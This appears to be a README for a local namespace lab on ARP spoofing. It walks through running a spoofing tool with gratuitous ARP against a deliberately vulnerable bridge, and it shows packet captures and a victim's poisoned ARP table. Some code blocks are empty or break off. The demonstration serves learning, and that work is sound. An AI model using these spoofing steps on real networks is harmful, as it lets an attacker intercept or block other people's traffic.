We can try out ARP spoofing on Linux with the source code and script in this directory.

Below is the layout of the environment created by the `setup.sh` shell script.


```shell
-------------------------
|   host                |

--------------------------


```
The shell script not only creates the environment but also \
sets `vbr0` to accept unsolicitied ARP packet, which \
makes it vulnerable to ARP spoofing attack.

In other words, if a switch located in that positon doesn't allow for \
unsolicitied ARP packets, you don't have to worry about being ARP spoofed :)

And adding to that, `vnet2` is configured to drop the packets coming in whose \
destination is not `11.168.0.200`, which means any packets set to be forwarded \
will be dropped. 

Let's check out the poor victim's mac table.

```shell
$ sudo ip netns exec vnet1 ip neigh
# no mac info 
$ 

```

Now, let's check if it can ping the host `11.168.0.1` as usual.

```shell
$ sudo ip netns exec vnet1 ping 11.168.0.1
PING 11.168.0.1 (11.168.0.1) 56(84) bytes of data.
64 bytes from 11.168.0.1: icmp_seq=1 ttl=64 time=0.084 ms
64 bytes from 11.168.0.1: icmp_seq=2 ttl=64 time=0.047 ms
64 bytes from 11.168.0.1: icmp_seq=3 ttl=64 time=0.059 ms
64 bytes from 11.168.0.1: icmp_seq=4 ttl=64 time=0.050 ms
^C
--- 11.168.0.1 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3072ms
rtt min/avg/max/mdev = 0.047/0.060/0.084/0.014 ms

```

Checking mac table again...

```shell
$ sudo ip netns exec vnet1 ip neigh
# now there is mac info!
11.168.0.1 dev veth11 lladdr 82:59:88:10:d3:fe REACHABLE

```

So far so good.

Clear all info from the mac table.

```shell
$ sudo ip netns exec vnet1 ip neigh flush all
$ sudo ip netns exec vnet1 ip neigh 
$

```

Now, we're going to use ARP spoof attack to interfere (DoS) with \
the normal flow of traffic.

In the section below, `g` flag means it will use [gratuitous ARP](https://wiki.wireshark.org/Gratuitous_ARP) to \
perform ARP spoofing. You can also use `ng` to perfrm ARP spoofing \
but it uses unsolicited ARP reply packet to do so.

```shell
$ sudo ip netns exec vnet2 ./spoof.out g
my: ifidx: 2 ip: 11.168.0.200 hw: 22 e8 90 6d 69 e5
victim: ip: 11.168.0.2 hw: 26 08 9a c4 c6 d3
gateway: ip: 11.168.0.1 hw: 82 59 88 10 d3 fe
spoofing? 

```

On the other terminal, I captured the ARP packets going back and forth as you can \
see below.

```shell
$ sudo ip netns exec vnet0 tshark -i vbr0
[sudo] password for thy: 
Running as user "root" and group "root". This could be dangerous.

    2 0.000037175 26:08:9a:c4:c6:d3 â†’ 22:e8:90:6d:69:e5 ARP 42 11.168.0.2 is at 26:08:9a:c4:c6:d3
    3 0.000059438 22:e8:90:6d:69:e5 â†’ Broadcast    ARP 42 Who has 11.168.0.1? Tell 11.168.0.200

```

From the victim's namespace, we can see the updated mac table.

```shell
$ sudo ip netns exec vnet1 ip neigh 
11.168.0.200 dev veth11 lladdr 22:e8:90:6d:69:e5 STALE
```

Now, back to the attacker, and hitting `enter` will make the program to \
send out gratuitous arp to perform spoofing attack.

```shell
$ sudo ip netns exec vnet2 ./spoof.out g
my: ifidx: 2 ip: 11.168.0.200 hw: 22 e8 90 6d 69 e5
victim: ip: 11.168.0.2 hw: 26 08 9a c4 c6 d3
gateway: ip: 11.168.0.1 hw: 82 59 88 10 d3 fe
spoofing? 
gratuitous arp...
gratuitous arp...

```

Seeing from packet capture, you can see that the program is lying \
about its IP association. Specifically, it's saying that IP `11.168.0.1`, \
which is `host`'s IP address is mapped to the attacker's mac address.

If the switch accepts this dubious claim (in our case it does), then any packet \
that's destined to `11.168.0.1` will end up trapped in `11.168.0.200`.

```

Precisely that happens as you can see from `ping` command below.

```shell
$ sudo ip netns exec vnet1 ping 11.168.0.1

```

It's also confirmed by the packet capture.

```shell
$ sudo ip netns exec vnet0 tshark -i vbr0 -f "icmp"
Running as user "root" and group "root". This could be dangerous.
